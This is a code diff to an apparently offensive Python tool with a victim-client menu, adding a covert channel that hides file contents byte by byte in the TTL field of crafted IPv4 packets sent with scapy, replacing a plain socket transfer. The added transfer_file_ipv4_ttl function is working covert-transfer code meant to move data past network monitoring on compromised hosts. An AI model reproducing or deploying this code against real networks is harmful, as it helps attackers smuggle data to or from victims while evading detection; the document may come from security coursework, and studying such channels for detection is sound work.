@@ -6,6 +6,10 @@ import sys
 import socket
 import threading
 import time
+
+from scapy.layers.inet import IP, ICMP
+from scapy.sendrecv import send, sniff
+
 import constants
 import ipaddress
 from typing import TextIO
@@ -316,6 +320,7 @@ def protocol_and_field_selector():
     choices[protocol] = header_field
     print(constants.PROTOCOL_SELECTED_MSG.format(protocol))
     print(constants.FIELD_SELECTED_MSG.format(header_field))
+
     return choices
 
 
@@ -339,7 +344,50 @@ def __print_header_choices(protocol_header_list: list):
     print(constants.MENU_CLOSING_BANNER)
 
 
+# Function to convert a string to binary
+def text_to_bin(text):
+    return ''.join(format(ord(char), '08b') for char in text)
+
+
+# Function to convert binary to a string
+def bin_to_text(binary):
+    return ''.join(chr(int(binary[i:i + 8], 2)) for i in range(0, len(binary), 8))
+
+
+def transfer_file_ipv4_ttl(dest_ip, file_path):
+    # Read the content of the file to hide in TTL
+    with open(file_path, 'r') as file:
+        file_content = file.read()
+
+    # Convert file content to binary
+    binary_data = text_to_bin(file_content)
+
+    # Split the binary data into chunks that fit within the TTL range (0-255)
+    chunk_size = 8  # Define the chunk size
+    chunks = [binary_data[i:i + chunk_size] for i in range(0, len(binary_data), chunk_size)]
+
+    # Craft packets for each chunk and send them with a corresponding TTL value
+    for i, chunk in enumerate(chunks):
+        # Convert the chunk to integer (0-255)
+        chunk_value = int(chunk, 2)
+
+        # Craft an IPv4 packet with the chunk value as TTL
+        packet = IP(dst=dest_ip, ttl=chunk_value)
+
+        # Send the packet
+        send(packet, verbose=0)
+
+
 def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int, choices: dict):
+    # Initialize Variables
+    protocol_header = None
+    field = None
+
+    # Get User Choice from Dict
+    for key, value in choices.items():
+        protocol_header = key
+        field = value
+
     # Get User Input for File + Check if Exists
     file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))
 
@@ -361,20 +409,10 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int, choi
             sock.send(file_name.encode())
             print(constants.FILE_NAME_TRANSFER_MSG.format(file_name))
 
-            # Wait for client/victim to buffer
-            time.sleep(1)
+            # Transfer File
+            transfer_file_ipv4_ttl(dest_ip, file_path)
 
-            with open(file_path, 'rb') as file:
-                while True:
-                    file_data = file.read(constants.BYTE_LIMIT)
-                    if not file_data:
-                        break
-                    sock.send(file_data)
-
-            # Send end-of-file marker
-            sock.send(constants.END_OF_FILE_SIGNAL)
-
-            # Get an ACK from victim for success
+            # # Get an ACK from victim for success
             transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
 
             if transfer_result == constants.VICTIM_ACK:
@@ -1227,7 +1265,3 @@ def perform_menu_item_11(client_list: dict,
     # Print closing statements
     print(constants.RETURN_MAIN_MENU_MSG)
     print(constants.MENU_CLOSING_BANNER)
-
-
-if __name__ == '__main__':
-    protocol_and_field_selector()
